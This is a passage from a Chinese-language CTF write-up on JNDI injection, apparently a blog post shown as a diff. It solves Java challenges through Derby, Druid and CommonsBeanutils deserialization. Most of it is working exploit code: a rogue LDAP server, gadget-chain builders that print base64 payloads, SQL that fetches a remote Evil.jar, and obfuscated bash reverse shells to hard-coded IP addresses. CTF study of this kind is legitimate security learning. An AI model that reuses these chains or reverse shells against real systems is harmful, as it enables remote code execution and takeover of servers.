+            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>));
+            ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> <span class="hljs-type">ReferenceWrapper</span>(ref);
+
+            registry.bind(<span class="hljs-string">&quot;pop&quot;</span>,referenceWrapper);
+        &#125;
+        <span class="hljs-keyword">catch</span>(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;
+
+<span class="hljs-keyword">import</span> javax.naming.Reference;
+<span class="hljs-keyword">import</span> javax.naming.StringRefAddr;
+<span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;
+<span class="hljs-keyword">import</span> javax.net.SocketFactory;
+<span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;
+<span class="hljs-keyword">import</span> java.net.InetAddress;
+<span class="hljs-keyword">import</span> java.util.ArrayList;
+<span class="hljs-keyword">import</span> java.util.List;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
+
+        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;
+
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);
+            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(
+                    <span class="hljs-string">&quot;listen&quot;</span>,
+                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>());
+            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);
+            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);
+            ds.startListening();
+        &#125;
+        <span class="hljs-keyword">catch</span> (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;
+
+        <span class="hljs-meta">@Override</span>
+        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result)</span> &#123;
+            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();
+            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);
+
+            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);
+            <span class="hljs-keyword">try</span> &#123;
+                List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
+                list.add(<span class="hljs-string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://host.docker.internal:8000/Evil.jar&#x27;, &#x27;APP.Evil&#x27;, 0)&quot;</span>);
+                list.add(<span class="hljs-string">&quot;CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Evil&#x27;)&quot;</span>);
+                list.add(<span class="hljs-string">&quot;CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;Evil.exec&#x27;&quot;</span>);
+                list.add(<span class="hljs-string">&quot;CALL cmd(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>);
+
+                <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>, <span class="hljs-literal">null</span>);
+                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;jdbc:derby:webdb;create=true&quot;</span>));
+                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>));
+                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>));
+                ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initConnectionSqls&quot;</span>, String.join(<span class="hljs-string">&quot;;&quot;</span>, list)));
+
+                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, SerializeUtil.serialize(ref));
+
+                result.sendSearchEntry(e);
+                result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));
+            &#125; <span class="hljs-keyword">catch</span> (Exception exception) &#123;
+                exception.printStackTrace();
+            &#125;
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<p>看你要执行的sql语句写对应jar包，要是是上面RMI执行空参函数，那就直接写命令</p>
+<p>像LDAP能传入String参数那就写个能传参的sql语句</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        Runtime.getRuntime().exec(cmd);
+    &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testShell4</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exec</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4yNC4xODgvNzc3NSA8JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);
+    &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs bash">javac src/Evil.java
+jar -cvf Evil.jar -C src/ .</code></pre></div>
+
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233615123.png" srcset="/img/loading.gif" lazyload alt="image-20240425233615123"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233630623.png" srcset="/img/loading.gif" lazyload alt="image-20240425233630623"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233650022.png" srcset="/img/loading.gif" lazyload alt="image-20240425233650022"></p>
+<p>是RMI的话由于对象和名称进行了绑定，所以要访问pop，差点忘了</p>
+<p>是LDAP的话，由于此处不需要加载class文件，所以任意名称即可</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233841470.png" srcset="/img/loading.gif" lazyload alt="image-20240425233841470"></p>
+<h3 id="Derby-Plus"><a href="#Derby-Plus" class="headerlink" title="Derby Plus"></a>Derby Plus</h3><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425234310876.png" srcset="/img/loading.gif" lazyload alt="image-20240425234310876"></p>
+<p>并且多给了个cb的依赖</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240425234717659.png" srcset="/img/loading.gif" lazyload alt="image-20240425234717659"></p>
+<h4 id="X1r0z-出题人-思路"><a href="#X1r0z-出题人-思路" class="headerlink" title="X1r0z(出题人)思路"></a>X1r0z(出题人)思路</h4><p>出题人的思路很有意思，现在没给jndi的注入点了，那就从原生反序列化到jndi注入</p>
+<p>那需要的就是LdapAttribute利用链</p>
+<p>用到的是LDAP服务端</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;
+
+<span class="hljs-keyword">import</span> javax.naming.CompositeName;
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.util.Base64;
+<span class="hljs-keyword">import</span> java.util.PriorityQueue;
+<span class="hljs-keyword">import</span> java.util.Queue;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cb</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+
+<span class="hljs-comment">//        String ldapCtxUrl = &quot;ldap://host.docker.internal:1389/&quot;;</span>
+<span class="hljs-comment">//        Class ldapAttributeClazz = Class.forName(&quot;com.sun.jndi.ldap.LdapAttribute&quot;);</span>
+<span class="hljs-comment">//        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(new Class[] &#123;String.class&#125;);</span>
+<span class="hljs-comment">//        ldapAttributeClazzConstructor.setAccessible(true);</span>
+<span class="hljs-comment">//        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(new Object[] &#123;&quot;name&quot;&#125;);</span>
+<span class="hljs-comment">//        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(&quot;baseCtxURL&quot;);</span>
+<span class="hljs-comment">//        baseCtxUrlField.setAccessible(true);</span>
+<span class="hljs-comment">//        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);</span>
+<span class="hljs-comment">//        Field rdnField = ldapAttributeClazz.getDeclaredField(&quot;rdn&quot;);</span>
+<span class="hljs-comment">//        rdnField.setAccessible(true);</span>
+<span class="hljs-comment">//        rdnField.set(ldapAttribute, new CompositeName(&quot;a//b&quot;));</span>
+<span class="hljs-comment">//</span>
+<span class="hljs-comment">//        BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);</span>
+<span class="hljs-comment">//        Queue queue = new PriorityQueue(2, comparator);</span>
+<span class="hljs-comment">//        queue.add(&quot;1&quot;);</span>
+<span class="hljs-comment">//        queue.add(&quot;1&quot;);</span>
+<span class="hljs-comment">//        setFieldValue(comparator, &quot;property&quot;, &quot;attributeDefinition&quot;);</span>
+<span class="hljs-comment">//        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;ldapAttribute, ldapAttribute&#125;);</span>
+
+        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);
+        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(String.class);
+        constructor.setAccessible(<span class="hljs-literal">true</span>);
+        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;name&quot;</span>);
+
+        setFieldValue(obj, <span class="hljs-string">&quot;baseCtxURL&quot;</span>, <span class="hljs-string">&quot;ldap://host.docker.internal:1389/&quot;</span>);
+<span class="hljs-comment">//        setFieldValue(obj, &quot;baseCtxURL&quot;, &quot;ldap://127.0.0.1:1389/&quot;);</span>
+        setFieldValue(obj, <span class="hljs-string">&quot;rdn&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompositeName</span>(<span class="hljs-string">&quot;a/b&quot;</span>));
+
+        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);
+        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, beanComparator);
+        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);
+        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);
+
+        beanComparator.setProperty(<span class="hljs-string">&quot;attributeDefinition&quot;</span>);
+        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);
+
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);
+
+        oos.writeObject(priorityQueue);
+        oos.close();
+        <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(barr.toByteArray());
+        System.out.println(a);
+
+
+<span class="hljs-comment">//        ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span>
+<span class="hljs-comment">//        inputStream.readObject();</span>
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+        <span class="hljs-keyword">try</span> &#123;
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;
+            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)
+                field = getField(clazz.getSuperclass(), fieldName);
+        &#125;
+        <span class="hljs-keyword">return</span> field;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        <span class="hljs-keyword">if</span>(field != <span class="hljs-literal">null</span>) &#123;
+            field.set(obj, value);
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<p>由于之前用过这个链子，导致我认为他肯定会请求a.class文件</p>
+<p>但其实高版本的jndi就不是请求文件了，而是像上面说的绕过方法，ldap就是反序列化数据</p>
+<p>这一点困了有点时间</p>
+<h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p>有点疑惑就是jdk1.8_202和jdk17生成的payload是一样的</p>
+<p>然后burp在打的时候，base64数据是不用进行url编码的，编码会使解密报错</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426183357206.png" srcset="/img/loading.gif" lazyload alt="image-20240426183357206"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426175513823.png" srcset="/img/loading.gif" lazyload alt="image-20240426175513823"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426174344175.png" srcset="/img/loading.gif" lazyload alt="image-20240426174344175"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426174319155.png" srcset="/img/loading.gif" lazyload alt="image-20240426174319155"></p>
+<h4 id="Boogipop思路"><a href="#Boogipop思路" class="headerlink" title="Boogipop思路"></a>Boogipop思路</h4><p>这位哥真的是炉火纯青啊，getter + jdbc</p>
+<blockquote>
+<p>已经是赤裸裸的在勾引了。打一个getter去触发getconnection，所以都不需要思考就找到了<br><code>DruidDataSource#getConnection</code></p>
+</blockquote>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426184341670.png" srcset="/img/loading.gif" lazyload alt="image-20240426184341670"></p>
+<p>这里也有init</p>
+<p>其实上面init之后的流程为什么能jdbc我也不了解。。。。</p>
+<p>知道就行，然后就能打了</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">import com.alibaba.druid.pool.DruidDataSource;
+import org.apache.commons.beanutils.BeanComparator;
+
+import javax.naming.CompositeName;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.Collections;
+import java.util.PriorityQueue;
+import java.util.StringTokenizer;
+
+public <span class="hljs-keyword">class</span> Druid_getter &#123;
+    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
+
+        DruidDataSource druidDataSource = <span class="hljs-keyword">new</span> <span class="hljs-constructor">DruidDataSource()</span>;
+        druidDataSource.set<span class="hljs-constructor">Url(<span class="hljs-string">&quot;jdbc:derby:dbname;create=true&quot;</span>)</span>;
+        druidDataSource.set<span class="hljs-constructor">DriverClassName(<span class="hljs-string">&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;</span>)</span>;
+        druidDataSource.set<span class="hljs-constructor">InitialSize(1)</span>;
+        StringTokenizer tokenizer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">StringTokenizer(<span class="hljs-string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://host.docker.internal:8000/Evil.jar&#x27;, &#x27;APP.Sample4&#x27;, 0);CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Sample4&#x27;);CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;Evil.exec&#x27;;CALL cmd(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguODkuNjEuNzEvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>)</span>;
+        druidDataSource.set<span class="hljs-constructor">ConnectionInitSqls(Collections.<span class="hljs-params">list</span>(<span class="hljs-params">tokenizer</span>)</span>);
+
+
+        BeanComparator beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BeanComparator(<span class="hljs-params">null</span>, String.CASE_INSENSITIVE_ORDER)</span>;
+        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">PriorityQueue(2, <span class="hljs-params">beanComparator</span>)</span>;
+        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);
+        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);
+
+        beanComparator.set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;connection&quot;</span>)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">druidDataSource</span>,<span class="hljs-string">&quot;logWriter&quot;</span>,<span class="hljs-params">null</span>)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">druidDataSource</span>,<span class="hljs-string">&quot;statLogger&quot;</span>,<span class="hljs-params">null</span>)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">druidDataSource</span>,<span class="hljs-string">&quot;transactionHistogram&quot;</span>,<span class="hljs-params">null</span>)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">druidDataSource</span>,<span class="hljs-string">&quot;initedLatch&quot;</span>,<span class="hljs-params">null</span>)</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">priorityQueue</span>, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">druidDataSource</span>, <span class="hljs-params">druidDataSource</span>&#125;)</span>;
+
+
+
+        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;
+
+        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">priorityQueue</span>)</span>;
+        oos.close<span class="hljs-literal">()</span>;
+        String a = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>);
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(a);
+
+
+<span class="hljs-comment">//        ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span>
+<span class="hljs-comment">//        inputStream.readObject();</span>
+    &#125;
+    public static Field get<span class="hljs-constructor">Field(<span class="hljs-params">final</span> Class&lt;?&gt; <span class="hljs-params">clazz</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>)</span> &#123;
+        Field field = null;
+        <span class="hljs-keyword">try</span> &#123;
+            field = clazz.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;
+            field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        &#125; catch (NoSuchFieldException ex) &#123;
+            <span class="hljs-keyword">if</span> (clazz.get<span class="hljs-constructor">Superclass()</span> != null)
+                field = get<span class="hljs-constructor">Field(<span class="hljs-params">clazz</span>.<span class="hljs-params">getSuperclass</span>()</span>, fieldName);
+        &#125;
+        return field;
+    &#125;
+    public static void set<span class="hljs-constructor">FieldValue(<span class="hljs-params">final</span> Object <span class="hljs-params">obj</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>, <span class="hljs-params">final</span> Object <span class="hljs-params">value</span>)</span> throws Exception &#123;
+        final Field field = get<span class="hljs-constructor">Field(<span class="hljs-params">obj</span>.<span class="hljs-params">getClass</span>()</span>, fieldName);
+        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        <span class="hljs-keyword">if</span>(field != null) &#123;
+            field.set(obj, value);
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<p>有细节</p>
+<div class="code-wrapper"><pre><code class="hljs">    setFieldValue(druidDataSource,&quot;logWriter&quot;,null);
+    setFieldValue(druidDataSource,&quot;statLogger&quot;,null);
+    setFieldValue(druidDataSource,&quot;transactionHistogram&quot;,null);
+    setFieldValue(druidDataSource,&quot;initedLatch&quot;,null);
+</code></pre></div>
+<p>这些属性初始值是被实例化的对象，但是他们不可序列化，设置为null即可</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426191038095.png" srcset="/img/loading.gif" lazyload alt="image-20240426191038095"></p>
+<p>当然运行环境是在jdk17，所以vm options自行添加</p>
+<h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426191821067.png" srcset="/img/loading.gif" lazyload alt="image-20240426191821067"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426191758373.png" srcset="/img/loading.gif" lazyload alt="image-20240426191758373"></p>
+<h2 id="相似方法的题目"><a href="#相似方法的题目" class="headerlink" title="相似方法的题目"></a>相似方法的题目</h2><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426193525666.png" srcset="/img/loading.gif" lazyload alt="image-20240426193525666"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426193547665.png" srcset="/img/loading.gif" lazyload alt="image-20240426193547665"></p>
+<p>额，过滤很简单</p>
+<p>jackson+signedObject二次反序列化，秒了</p>
+<p>这里文章也提出了从原生反序列化到jndi注入的LDAPAttribute利用链</p>
+<p>然后LDAP服务端放的是jackson的反序列化链</p>
+<p>就这样</p>
+<h2 id="HZNUCTF-2023-final-ezjava"><a href="#HZNUCTF-2023-final-ezjava" class="headerlink" title="[HZNUCTF 2023 final]ezjava"></a>[HZNUCTF 2023 final]ezjava</h2><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240426194606660.png" srcset="/img/loading.gif" lazyload alt="image-20240426194606660"></p>
+<p>一眼log4j，并且log4j本质就是ldap</p>
+<p>这里提示fastjson就是利用高版本绕过，LDAP服务端放的是fastjson的反序列化链</p>
+<p>ok，结束</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://exp10it.io/2022/12/jndi-%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/">https://exp10it.io/2022/12/jndi-%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://exp10it.io/2024/02/n1ctf-junior-2024-web-official-writeup/[](https://boogipop.com/2024/02/05/2024%20N1CTF%20Junior%20Web%20Writeup/)">https://exp10it.io/2024/02/n1ctf-junior-2024-web-official-writeup/[](https://boogipop.com/2024/02/05/2024%20N1CTF%20Junior%20Web%20Writeup/)</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2024/02/05/2024%20N1CTF%20Junior%20Web%20Writeup/">https://boogipop.com/2024/02/05/2024%20N1CTF%20Junior%20Web%20Writeup/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>JNDI注入</div>
+      <div>https://zer0peach.github.io/2024/04/18/JNDI注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/15/D-3CTF2023-ezjava/" title="D^3CTF2023--ezjava">
+                        <span class="hidden-mobile">D^3CTF2023--ezjava</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
